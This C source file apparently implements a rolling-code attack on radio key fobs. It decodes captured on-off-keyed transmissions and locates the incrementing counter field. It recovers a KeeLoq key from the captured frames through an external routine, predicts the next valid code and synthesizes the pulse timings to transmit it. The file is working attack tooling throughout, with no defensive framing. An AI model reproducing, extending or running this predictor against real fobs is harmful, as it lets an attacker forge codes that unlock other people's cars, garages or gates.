/* Bit decode, counter-field search, KeeLoq hook-up, and OOK re-encode. */
#include "fob_predict.h"
#include "fob_keeloq.h"
#include <string.h>

#define FOB_MAX_EDGES 768u

static uint16_t median_us(uint16_t *v, unsigned n) {
    if (n == 0u) return 400u;
    for (unsigned i = 0; i + 1u < n; i++) {
        for (unsigned j = i + 1u; j < n; j++) {
            if (v[j] < v[i]) {
                const uint16_t t = v[i];
                v[i] = v[j];
                v[j] = t;
            }
        }
    }
    return v[n / 2u];
}

static void bit_set(uint8_t *bits, unsigned i, bool v) {
    if (v) bits[i >> 3] |= (uint8_t)(1u << (i & 7u));
    else bits[i >> 3] &= (uint8_t)~(1u << (i & 7u));
}

static bool bit_get(const uint8_t *bits, unsigned i) {
    return (bits[i >> 3] >> (i & 7u)) & 1u;
}

static uint16_t rd_u16_le(const uint8_t *bits, unsigned off) {
    uint16_t v = 0;
    for (unsigned i = 0; i < 16u; i++) {
        if (bit_get(bits, off + i)) v |= (uint16_t)(1u << i);
    }
    return v;
}

static uint16_t rd_u16_be(const uint8_t *bits, unsigned off) {
    uint16_t v = 0;
    for (unsigned i = 0; i < 16u; i++) {
        if (bit_get(bits, off + i)) v = (uint16_t)((v << 1u) | 1u);
        else v = (uint16_t)(v << 1u);
    }
    return v;
}

static void wr_u16_le(uint8_t *bits, unsigned off, uint16_t v) {
    for (unsigned i = 0; i < 16u; i++) bit_set(bits, off + i, (v >> i) & 1u);
}

static void wr_u16_be(uint8_t *bits, unsigned off, uint16_t v) {
    for (int i = 15; i >= 0; i--) {
        bit_set(bits, off + (unsigned)(15 - i), (v >> i) & 1u);
    }
}

static uint32_t rd_u32_le(const uint8_t *bits, unsigned off) {
    uint32_t v = 0;
    for (unsigned i = 0; i < 32u; i++) {
        if (bit_get(bits, off + i)) v |= 1u << i;
    }
    return v;
}

static void wr_u32_le(uint8_t *bits, unsigned off, uint32_t v) {
    for (unsigned i = 0; i < 32u; i++) bit_set(bits, off + i, (v >> i) & 1u);
}

static uint16_t rd_ctr(const fob_decoded_t *f, unsigned off, bool be) {
    return be ? rd_u16_be(f->bits, off) : rd_u16_le(f->bits, off);
}

void fob_predict_init(fob_predict_t *p) {
    if (p) memset(p, 0, sizeof *p);
}

void fob_predict_clear(fob_predict_t *p) {
    if (p) memset(p, 0, sizeof *p);
}

bool fob_decode_ook(const uint16_t *dur, uint16_t n, bool first_level,
                    fob_decoded_t *out) {
    (void)first_level;
    if (dur == NULL || out == NULL || n < 16u) return false;

    uint16_t pool[FOB_MAX_EDGES];
    unsigned np = 0;
    for (uint16_t i = 0; i < n && np < FOB_MAX_EDGES; i++) {
        if (dur[i] >= 80u && dur[i] <= 8000u) pool[np++] = dur[i];
    }
    if (np < 8u) return false;

    uint16_t scratch[FOB_MAX_EDGES];
    memcpy(scratch, pool, np * sizeof scratch[0]);
    const uint16_t med = median_us(scratch, np);
    uint16_t shorts[FOB_MAX_EDGES];
    uint16_t longs[FOB_MAX_EDGES];
    unsigned ns = 0, nl = 0;
    for (unsigned i = 0; i < np; i++) {
        if (pool[i] <= med) {
            if (ns < FOB_MAX_EDGES) shorts[ns++] = pool[i];
        } else if (nl < FOB_MAX_EDGES) {
            longs[nl++] = pool[i];
        }
    }
    if (ns == 0u || nl == 0u) return false;

    memcpy(scratch, shorts, ns * sizeof scratch[0]);
    out->short_us = median_us(scratch, ns);
    memcpy(scratch, longs, nl * sizeof scratch[0]);
    out->long_us = median_us(scratch, nl);
    out->bit_us = (uint32_t)out->short_us + out->long_us;
    if (out->bit_us == 0u) return false;

    const uint16_t thr = (uint16_t)((out->short_us + out->long_us) / 2u);
    unsigned bit_i = 0;
    memset(out->bits, 0, sizeof out->bits);
    out->preamble_edges = 0;

    for (uint16_t e = 0; e + 1u < n && bit_i < FOB_PRED_MAX_BITS; e += 2u) {
        const uint32_t cell = (uint32_t)dur[e] + dur[e + 1u];
        if (cell > out->bit_us * 3u) {
            out->preamble_edges = (uint16_t)(e + 2u);
            bit_i = 0;
            memset(out->bits, 0, sizeof out->bits);
            continue;
        }
        const bool b = dur[e] >= thr || cell >= out->bit_us + thr / 2u;
        bit_set(out->bits, bit_i++, b);
    }
    out->nbits = (uint8_t)bit_i;
    return out->nbits >= 24u;
}

static bool find_counter_field(const fob_predict_t *p, uint8_t *off,
                               uint8_t *bits, uint16_t *delta, uint16_t *last,
                               bool be) {
    if (p->ncaptures < 2u) return false;
    const unsigned nbits = p->frame[0].nbits;
    if (nbits < 16u) return false;

    for (unsigned o = 0; o + 16u <= nbits; o++) {
        uint16_t prev = rd_ctr(&p->frame[0], o, be);
        uint16_t d = 0;
        bool ok = true;
        for (unsigned f = 1; f < p->ncaptures; f++) {
            if (p->frame[f].nbits != nbits) {
                ok = false;
                break;
            }
            const uint16_t cur = rd_ctr(&p->frame[f], o, be);
            const uint16_t step = (uint16_t)(cur - prev);
            if (f == 1u) d = step;
            else if (step != d) {
                ok = false;
                break;
            }
            prev = cur;
        }
        if (!ok || d == 0u) continue;
        *off = (uint8_t)o;
        *bits = 16u;
        *delta = d;
        *last = rd_ctr(&p->frame[p->ncaptures - 1u], o, be);
        return true;
    }
    return false;
}

static bool frames_same_except_counter(const fob_predict_t *p, uint8_t off) {
    const unsigned nbits = p->frame[0].nbits;
    for (unsigned f = 1; f < p->ncaptures; f++) {
        if (p->frame[f].nbits != nbits) return false;
        for (unsigned i = 0; i < nbits; i++) {
            if (i >= off && i < off + 16u) continue;
            if (bit_get(p->frame[0].bits, i) != bit_get(p->frame[f].bits, i)) {
                return false;
            }
        }
    }
    return true;
}

static bool try_keeloq(fob_predict_t *p) {
    if (p->ncaptures < 2u || !p->ctr_ok) return false;

    const unsigned nbits = p->frame[0].nbits;
    if (nbits < 32u) return false;
    const unsigned payload_off = nbits - 32u;

    uint32_t plain[8];
    uint32_t cipher[8];
    for (unsigned i = 0; i < p->ncaptures; i++) {
        cipher[i] = rd_u32_le(p->frame[i].bits, payload_off);
        const uint16_t ctr = rd_ctr(&p->frame[i], p->ctr_off, p->ctr_be);
        uint16_t serial = 0;
        if (p->ctr_off >= 16u) {
            serial = rd_u16_be(p->frame[i].bits, p->ctr_off - 16u);
        }
        plain[i] = ((uint32_t)serial << 16u) | ctr;
    }

    uint64_t key = 0;
    if (!keeloq_recover_key(plain, cipher, p->ncaptures, &key)) return false;

    for (unsigned i = 0; i < p->ncaptures; i++) {
        if (keeloq_encrypt(plain[i], key) != cipher[i]) return false;
    }

    p->kl_key = key;
    p->kl_ok = true;
    p->kl_serial = (uint16_t)(plain[0] >> 16u);
    const uint32_t next_plain =
        ((uint32_t)p->kl_serial << 16u) |
        (uint32_t)(p->ctr_last + p->ctr_delta);
    p->pred_frame = keeloq_encrypt(next_plain, key);
    p->pred_ctr = (uint16_t)(p->ctr_last + p->ctr_delta);
    return true;
}

static void build_ctr_prediction(fob_predict_t *p) {
    if (!p->ctr_ok || p->ncaptures == 0u) {
        p->pred_ok = false;
        return;
    }
    const fob_decoded_t *ref = &p->frame[p->ncaptures - 1u];
    p->pred_bits = *ref;
    const uint16_t next = (uint16_t)(p->ctr_last + p->ctr_delta);
    if (p->ctr_be) wr_u16_be(p->pred_bits.bits, p->ctr_off, next);
    else wr_u16_le(p->pred_bits.bits, p->ctr_off, next);

    p->pred_ctr = next;
    if (ref->nbits >= 32u) {
        p->pred_frame = rd_u32_le(p->pred_bits.bits, ref->nbits - 32u);
    } else {
        p->pred_frame = next;
    }
    p->pred_ok = true;
}

static void build_kl_prediction(fob_predict_t *p) {
    p->kl_ok = false;
    if (p->ncaptures < 2u || !p->ctr_ok) {
        build_ctr_prediction(p);
        return;
    }
    if (!frames_same_except_counter(p, p->ctr_off)) {
        build_ctr_prediction(p);
        return;
    }
    if (!try_keeloq(p)) {
        build_ctr_prediction(p);
        return;
    }
    const fob_decoded_t *ref = &p->frame[p->ncaptures - 1u];
    p->pred_bits = *ref;
    if (ref->nbits >= 32u) {
        wr_u32_le(p->pred_bits.bits, ref->nbits - 32u, p->pred_frame);
    }
    p->pred_ok = true;
}

bool fob_predict_add(fob_predict_t *p, const uint16_t *dur, uint16_t n,
                     bool first_level, uint8_t predictor) {
    if (p == NULL || p->ncaptures >= 8u) return false;
    fob_decoded_t dec;
    if (!fob_decode_ook(dur, n, first_level, &dec)) return false;
    p->frame[p->ncaptures++] = dec;
    return fob_predict_update(p, predictor);
}

bool fob_predict_update(fob_predict_t *p, uint8_t predictor) {
    if (p == NULL || p->ncaptures < 2u) {
        if (p) p->pred_ok = false;
        return false;
    }

    p->ctr_ok = find_counter_field(p, &p->ctr_off, &p->ctr_bits, &p->ctr_delta,
                                   &p->ctr_last, false);
    p->ctr_be = false;
    if (!p->ctr_ok) {
        p->ctr_ok = find_counter_field(p, &p->ctr_off, &p->ctr_bits,
                                       &p->ctr_delta, &p->ctr_last, true);
        p->ctr_be = p->ctr_ok;
    }

    if (!p->ctr_ok) {
        p->pred_ok = false;
        p->kl_ok = false;
        return false;
    }

    if (predictor == FOB_PRED_KL) build_kl_prediction(p);
    else build_ctr_prediction(p);
    return p->pred_ok;
}

bool fob_predict_synth(const fob_predict_t *p, const uint16_t *ref_dur,
                         uint16_t ref_n, bool first_level,
                         uint16_t *out_dur, uint16_t *out_n, uint16_t max_n) {
    (void)first_level;
    if (p == NULL || !p->pred_ok || out_dur == NULL || out_n == NULL ||
        ref_dur == NULL || ref_n < 16u) {
        return false;
    }

    const fob_decoded_t *pred = &p->pred_bits;
    const fob_decoded_t *ref = &p->frame[p->ncaptures - 1u];
    uint16_t n = 0;

    uint16_t pre = ref->preamble_edges;
    if (pre == 0u) pre = 8u;
    if (pre > ref_n) pre = 8u;
    for (uint16_t i = 0; i < pre && n < max_n; i++) out_dur[n++] = ref_dur[i];

    const uint16_t short_us = ref->short_us ? ref->short_us : 400u;
    const uint16_t long_us = ref->long_us ? ref->long_us : 800u;

    for (unsigned b = 0; b < pred->nbits && n + 1u < max_n; b++) {
        const bool bit = bit_get(pred->bits, b);
        out_dur[n++] = bit ? long_us : short_us;
        out_dur[n++] = bit ? short_us : long_us;
    }

    *out_n = n;
    return n >= 16u;
}
